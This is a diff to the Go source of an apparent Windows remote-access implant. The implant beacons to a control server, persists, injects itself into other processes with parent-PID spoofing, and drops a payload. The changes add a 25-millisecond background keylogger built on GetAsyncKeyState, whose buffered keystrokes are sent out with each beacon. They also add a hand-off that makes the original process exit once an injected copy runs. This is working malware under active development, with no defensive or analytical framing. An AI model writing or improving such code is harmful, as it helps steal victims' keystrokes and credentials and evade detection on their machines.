@@ -21,6 +21,7 @@ import (
 	"path/filepath"
 	"runtime"
 	"strings"
+	"sync"
 	"syscall"
 	"time"
 	"unsafe"
@@ -390,20 +391,6 @@ func httpDo(host, port, path, body string, useTLS bool) []byte {
 	return b
 }
 
-func keylogTick() string {
-	var b strings.Builder
-	for vk := 8; vk < 256; vk++ {
-		r, _, _ := pAsyncKey.Call(uintptr(vk))
-		if r&1 != 0 {
-			fmt.Fprintf(&b, "%02X", vk)
-			if b.Len() > 900 {
-				break
-			}
-		}
-	}
-	return b.String()
-}
-
 func atoiDef(s string, d int) int {
 	n := 0
 	for _, c := range s {
@@ -624,15 +611,64 @@ func runTask(tID, command, argsJSON, host, port string, useTLS bool, hwid string
 	httpDo(host, port, "/beacon", string(body), useTLS)
 }
 
-func injectSelf(method string, ppid bool) {
-	if method == "" || method == "none" {
-		return
+func injectSelf(method string, ppid bool) bool {
+	if method == "" || strings.ToLower(strings.TrimSpace(method)) == "none" {
+		return false
 	}
 	exe, err := os.Executable()
 	if err != nil || exe == "" {
-		return
+		return false
 	}
-	_ = launchInjected(exe, method, ppid)
+	return launchInjected(exe, method, ppid)
+}
+
+// injected reports whether this copy was started by our own remote-thread spawn.
+// The marker rides in the command line so it survives the hand-off, unlike an
+// env var (WinExec cannot set one) or a file flag (which would stick forever).
+func injected() bool {
+	for _, a := range os.Args[1:] {
+		if strings.TrimSpace(a) == "--umbra-inj" {
+			return true
+		}
+	}
+	return false
+}
+
+var (
+	keyMu  sync.Mutex
+	keyBuf strings.Builder
+	keyOn  = map[int]bool{}
+)
+
+// keylogSampler samples GetAsyncKeyState far faster than the beacon interval so
+// keystrokes are captured as they happen instead of once per sleep cycle.
+func keylogSampler() {
+	t := time.NewTicker(25 * time.Millisecond)
+	defer t.Stop()
+	for range t.C {
+		for vk := 8; vk < 256; vk++ {
+			r, _, _ := pAsyncKey.Call(uintptr(vk))
+			down := r&0x8000 != 0
+			if down && !keyOn[vk] {
+				keyOn[vk] = true
+				keyMu.Lock()
+				if keyBuf.Len() < 8000 {
+					fmt.Fprintf(&keyBuf, "%02X ", vk)
+				}
+				keyMu.Unlock()
+			} else if !down && keyOn[vk] {
+				keyOn[vk] = false
+			}
+		}
+	}
+}
+
+func keylogTick() string {
+	keyMu.Lock()
+	defer keyMu.Unlock()
+	s := keyBuf.String()
+	keyBuf.Reset()
+	return strings.TrimSpace(s)
 }
 
 func main() {
@@ -682,12 +718,22 @@ func main() {
 	if tf(cfg, "persistence") {
 		persist(exe)
 	}
+	if !injected() {
+		inj := cfg["injection_method"]
+		ppid := tf(cfg, "ppid_spoof")
+		if injectSelf(inj, ppid) {
+			// Hand off: the injected copy owns the beacon loop from here, so the
+			// original stops instead of running a second agent on the same host.
+			pSleep.Call(2000)
+			os.Exit(0)
+		}
+	}
 	inj := cfg["injection_method"]
 	ppid := tf(cfg, "ppid_spoof")
-	injectSelf(inj, ppid)
 	if c := extractCarrier(raw); len(c) > 0 {
 		go dropCarrier(c, inj, ppid)
 	}
+	go keylogSampler()
 
 	hostn, _ := os.Hostname()
 	user := username()
